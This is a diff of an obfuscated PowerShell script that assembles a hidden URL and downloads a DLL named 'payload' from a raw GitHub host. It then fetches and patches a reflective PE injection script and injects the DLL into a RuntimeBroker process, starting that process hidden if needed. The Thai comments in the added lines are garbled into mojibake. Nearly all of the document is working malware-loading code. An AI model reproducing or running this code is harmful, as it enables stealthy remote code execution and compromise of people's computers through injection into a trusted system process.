@@ -1,6 +1,6 @@
 $ErrorActionPreference = "Stop"
 
-# URL ของ DLL ที่จะ inject
+# URL à¸‚à¸­à¸‡ DLL à¸—à¸µà¹ˆà¸ˆà¸° inject
 $_0x91A = @(
 "https://raw",
 ".githubusercontent",
@@ -10,43 +10,63 @@ $_0x91A = @(
 "payload"
 ) -join ""
 
-# หา RuntimeBroker process
-$targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+Write-Host "[*] Searching for RuntimeBroker.exe..." -ForegroundColor Cyan
 
-if ($null -eq $targetProc) {
-    # เปิด Windows Store เพื่อ trigger RuntimeBroker
-    Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 3
+# à¸«à¸² RuntimeBroker process
+$runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+
+if ($null -eq $runtimeProc) {
+    Write-Host "[!] RuntimeBroker not found, starting new instance..." -ForegroundColor Yellow
     
-    $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-    
-    if ($null -eq $targetProc) {
-        # ลองเปิด Settings app
-        Start-Process "ms-settings:" -WindowStyle Hidden -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 3
-        
-        $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-        
-        if ($null -eq $targetProc) {
-            Write-Host "[ERROR] RuntimeBroker not found" -ForegroundColor Red
-            exit 1
+    # à¹€à¸›à¸´à¸” RuntimeBroker à¹‚à¸”à¸¢à¸•à¸£à¸‡ (à¸•à¹‰à¸­à¸‡à¹ƒà¸Šà¹‰ -PackageFullName parameter)
+    $runtimePath = "C:\Windows\System32\RuntimeBroker.exe"
+    if (Test-Path $runtimePath) {
+        # à¸§à¸´à¸˜à¸µà¸—à¸µà¹ˆ 1: à¹€à¸›à¸´à¸”à¸œà¹ˆà¸²à¸™ COM object
+        try {
+            $shell = New-Object -ComObject WScript.Shell
+            $shell.Run($runtimePath, 0, $false)
+            Start-Sleep -Seconds 3
+        } catch {
+            # à¸§à¸´à¸˜à¸µà¸—à¸µà¹ˆ 2: à¹€à¸›à¸´à¸”à¸œà¹ˆà¸²à¸™ Start-Process à¹à¸šà¸š background
+            Start-Process $runtimePath -WindowStyle Hidden -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
         }
+        
+        # à¸¥à¸­à¸‡à¸«à¸²à¸­à¸µà¸à¸„à¸£à¸±à¹‰à¸‡
+        $runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+        
+        if ($null -eq $runtimeProc) {
+            # à¸§à¸´à¸˜à¸µà¸—à¸µà¹ˆ 3: trigger à¸œà¹ˆà¸²à¸™ Windows Store
+            Write-Host "[*] Trying alternative method..." -ForegroundColor Yellow
+            Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            
+            $runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+            
+            if ($null -eq $runtimeProc) {
+                Write-Host "[ERROR] Failed to start RuntimeBroker. Please start it manually and run this script again." -ForegroundColor Red
+                Write-Host "[INFO] You can start any Windows Store app to trigger RuntimeBroker" -ForegroundColor Cyan
+                exit 1
+            }
+        }
+    } else {
+        Write-Host "[ERROR] RuntimeBroker.exe not found at $runtimePath" -ForegroundColor Red
+        exit 1
     }
 }
 
-$targetPID = $targetProc.Id
+$targetPID = $runtimeProc.Id
+Write-Host "[+] Found RuntimeBroker PID: $targetPID" -ForegroundColor Green
 
-# ดาวน์โหลด DLL
+# à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸” DLL
+Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
 $_0x7C1 = New-Object System.Net.WebClient
 $_0x7C1.Headers.Add("User-Agent", "Mozilla/5.0")
 $_0x5F9 = $_0x7C1.DownloadData($_0x91A)
+Write-Host "[+] DLL downloaded ($($_.0x5F9.Length) bytes)" -ForegroundColor Green
 
-if ($_0x5F9.Length -eq 0) {
-    Write-Host "[ERROR] Failed to download DLL" -ForegroundColor Red
-    exit 1
-}
-
-# ดาวน์โหลด Reflective PE Injection script
+# à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸” Reflective PE Injection script
+Write-Host "[*] Downloading injection script..." -ForegroundColor Cyan
 $_0x3D2 = @(
 "https://raw",
 ".githubusercontent",
@@ -59,7 +79,7 @@ $_0x3D2 = @(
 $_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
 Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
 
-# แก้ไข script
+# à¹à¸à¹‰à¹„à¸‚ script (fix GetProcAddress à¹à¸¥à¸° GetModuleHandle)
 $_0xA77 = Get-Content $_0x8E4 -Raw
 $_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
 $_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
@@ -67,10 +87,11 @@ $_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMe
 $_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
 $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
-# โหลด injection script
+# à¹‚à¸«à¸¥à¸” injection script
 . $_0xC11
 
-# Inject
+# Inject à¹€à¸‚à¹‰à¸² RuntimeBroker
+Write-Host "[*] Injecting into PID $targetPID..." -ForegroundColor Cyan
 try {
     Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $targetPID
     Write-Host "[SUCCESS] Injection completed!" -ForegroundColor Green
@@ -78,3 +99,9 @@ try {
     Write-Host "[ERROR] Injection failed: $_" -ForegroundColor Red
     exit 1
 }
+
+# à¹€à¸›à¸´à¸” PowerShell history (optional)
+Start-Process "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+
+Write-Host "`n[*] Done! Press any key to exit..." -ForegroundColor Cyan
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
